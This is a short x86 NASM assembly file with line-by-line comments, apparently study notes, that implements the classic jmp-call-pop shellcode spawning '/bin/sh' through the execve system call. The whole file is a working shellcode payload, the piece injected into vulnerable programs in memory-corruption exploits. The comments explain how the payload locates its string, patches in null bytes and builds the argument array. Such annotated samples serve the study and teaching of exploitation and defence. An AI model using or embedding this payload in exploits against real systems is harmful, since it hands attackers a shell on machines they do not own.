section .text
global _start

_start:
    BITS 32                 ; directive
    jmp short two           ; short jumps are jumps whose target is in the same module

one:
    pop ebx                 ; gets the address of string at [2] and saves it to ebx
    xor eax, eax
    mov [ebx+7], al         ; save 0x00 (1 byte) to memory at address ebx+7 (where the * is)
    mov [ebx+8], ebx        ; save ebx, which is the address of [2], (4 bytes) to memory at address ebx+8 (where AAAA is)
    mov [ebx+12], eax       ; save eax, which is 0x00000000 (4 bytes) (NULL address), to memory at address ebx+12 (where BBBB is)
    lea ecx, [ebx+8]        ; ecx = ebx+8 | load the address where AAAA was in the string
    
    xor edx, edx            ; For environment variable | Or lea edx, [ebx+12]
    
    mov al, 0x0b
    
    ; eax <- 11
    ; ebx <- string address
    ; ecx <- argv[] address 
    ; edx <- 0
    
    int 0x80

two:
    call one                ; before it jumps it keeps a record of the address of the next instruction as the return address         
    db '/bin/sh*AAAABBBB'   ; [2]


;----------
; lea (load effective address) --> is used to put a memory address into the destination. 
; lea destination, source
;----------